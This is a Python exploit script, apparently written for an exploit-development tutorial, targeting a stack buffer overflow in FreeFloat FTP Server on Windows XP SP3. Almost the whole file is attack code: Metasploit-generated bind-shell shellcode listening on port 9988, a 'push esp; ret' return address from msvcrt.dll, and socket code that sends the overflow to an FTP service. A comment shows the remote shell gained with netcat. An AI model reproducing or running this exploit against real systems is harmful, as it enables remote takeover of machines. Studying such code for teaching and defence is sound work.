#!/usr/bin/python
 
#----------------------------------------------------------------------------------#
# Exploit: FreeFloat FTP (MKD BOF)                                                 #
# OS: WinXP PRO SP3                                                                #
# Author: b33f (Ruben Boonen)                                                      #
# Software: http://www.freefloat.com/software/freefloatftpserver.zip               #
#----------------------------------------------------------------------------------#
# This exploit was created for Part 2 of my Exploit Development tutorial series... #
# http://www.fuzzysecurity.com/tutorials/expDev/2.html                             #
#----------------------------------------------------------------------------------#
# root@bt:~/Desktop# nc -nv 192.168.111.128 9988                                   #
# (UNKNOWN) [192.168.111.128] 9988 (?) open                                        #
# Microsoft Windows XP [Version 5.1.2600]                                          #
# (C) Copyright 1985-2001 Microsoft Corp.                                          #
#                                                                                  #
# C:\Documents and Settings\Administrator\Desktop>                                 #
#----------------------------------------------------------------------------------#
 
import socket
import sys
 
#----------------------------------------------------------------------------------#
# msfpayload windows/shell_bind_tcp LPORT=9988 R| msfencode -b '\x00\x0A\x0D' -t c #
# [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)                     #
#----------------------------------------------------------------------------------#
 
shellcode = (
"\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27"
"\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9"
"\x11\xb2\xc1\x4a\x57\x1b\xe5\xfb\xd2\x7d\xc8\xfc\xd2\x41\x86"
"\x3e\x74\x3e\xd5\x12\x56\x7f\x16\x67\x97\xb8\x4b\x87\xc5\x11"
"\x07\x35\xfa\x16\x55\x85\xfb\xf8\xd1\xb5\x83\x7d\x25\x41\x3e"
"\x7f\x76\xf9\x35\x37\x6e\x72\x11\xe8\x8f\x57\x41\xd4\xc6\xdc"
"\xb2\xae\xd8\x34\x8b\x4f\xeb\x78\x40\x6e\xc3\x75\x98\xb6\xe4"
"\x65\xef\xcc\x16\x18\xe8\x16\x64\xc6\x7d\x8b\xce\x8d\x26\x6f"
"\xee\x42\xb0\xe4\xfc\x2f\xb6\xa3\xe0\xae\x1b\xd8\x1d\x3b\x9a"
"\x0f\x94\x7f\xb9\x8b\xfc\x24\xa0\x8a\x58\x8b\xdd\xcd\x05\x74"
"\x78\x85\xa4\x61\xfa\xc4\xa0\x46\x31\xf7\x30\xc0\x42\x84\x02"
"\x4f\xf9\x02\x2f\x18\x27\xd4\x50\x33\x9f\x4a\xaf\xbb\xe0\x43"
"\x74\xef\xb0\xfb\x5d\x8f\x5a\xfc\x62\x5a\xcc\xac\xcc\x34\xad"
"\x1c\xad\xe4\x45\x77\x22\xdb\x76\x78\xe8\x6a\xb1\xb6\xc8\x3f"
"\x56\xbb\xee\x98\xa2\x32\x08\x8c\xba\x12\x82\x38\x79\x41\x1b"
"\xdf\x82\xa3\x37\x48\x15\xfb\x51\x4e\x1a\xfc\x77\xfd\xb7\x54"
"\x10\x75\xd4\x60\x01\x8a\xf1\xc0\x48\xb3\x92\x9b\x24\x76\x02"
"\x9b\x6c\xe0\xa7\x0e\xeb\xf0\xae\x32\xa4\xa7\xe7\x85\xbd\x2d"
"\x1a\xbf\x17\x53\xe7\x59\x5f\xd7\x3c\x9a\x5e\xd6\xb1\xa6\x44"
"\xc8\x0f\x26\xc1\xbc\xdf\x71\x9f\x6a\xa6\x2b\x51\xc4\x70\x87"
"\x3b\x80\x05\xeb\xfb\xd6\x09\x26\x8a\x36\xbb\x9f\xcb\x49\x74"
"\x48\xdc\x32\x68\xe8\x23\xe9\x28\x18\x6e\xb3\x19\xb1\x37\x26"
"\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3"
"\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92")
 
#----------------------------------------------------------------------------------#
# Badchars: \x00\x0A\x0D                                                           #
# 0x77c35459 : push esp #  ret  | msvcrt.dll                                       #
# shellcode at ESP => space 749-bytes                                              #
#----------------------------------------------------------------------------------#
 
evil = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + shellcode 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.128',21))
response = s.recv(1024)
print response
s.send('USER ' + evil + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()

